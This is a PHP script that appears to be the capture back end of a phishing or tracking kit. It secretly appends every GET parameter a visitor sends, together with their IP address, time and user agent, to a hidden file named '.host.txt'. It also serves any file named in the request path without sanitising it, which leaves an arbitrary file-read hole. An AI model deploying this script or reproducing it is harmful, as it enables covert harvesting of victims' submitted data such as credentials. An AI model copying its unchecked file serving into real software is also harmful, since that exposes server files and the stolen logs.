<?php
session_start();
date_default_timezone_set('Asia/Jakarta');

$log_file = '.host.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

if(!empty($_GET)) {
    $log_data = "=========================\n";
    $log_data .= "GET DATA CAPTURED\n";
    $log_data .= "=========================\n";
    $log_data .= "IP: $ip\n";
    $log_data .= "Time: $time\n";
    $log_data .= "URL: " . $_SERVER['REQUEST_URI'] . "\n";
    
    foreach($_GET as $key => $value) {
        $log_data .= "$key: $value\n";
    }
    
    $log_data .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $log_data .= "=========================\n\n";
    
    file_put_contents($log_file, $log_data, FILE_APPEND);
}

// Serve static files
$request = ltrim($_SERVER['REQUEST_URI'], '/');
if(file_exists($request) && !is_dir($request)) {
    $mime_types = array(
        'html' => 'text/html',
        'css' => 'text/css',
        'js' => 'application/javascript',
        'png' => 'image/png',
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif' => 'image/gif'
    );
    
    $ext = pathinfo($request, PATHINFO_EXTENSION);
    if(isset($mime_types[$ext])) {
        header("Content-Type: " . $mime_types[$ext]);
    }
    
    readfile($request);
    exit();
}

// Default to index
header('Location: index.php');
?>